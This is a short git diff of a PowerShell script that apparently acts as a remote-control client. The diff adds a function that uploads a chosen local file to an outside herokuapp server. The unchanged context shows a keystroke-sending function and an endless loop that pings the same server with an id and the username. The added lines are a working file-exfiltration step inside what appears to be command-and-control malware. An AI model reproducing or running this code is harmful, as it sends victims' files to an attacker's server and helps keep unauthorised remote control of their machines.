@@ -47,6 +47,11 @@ function S {
  k("{ENTER}")
 }
 
+function U {
+param($String)
+(New-Object System.Net.WebClient).UploadFile("http://y44v5ltr.herokuapp.com/psfileupload",".\" + $String)
+}
+
 while (1) 
 {
 (New-Object System.Net.WebClient).DownloadString("http://y44v5ltr.herokuapp.com/rs/ping/" + $id + "/" + $username)
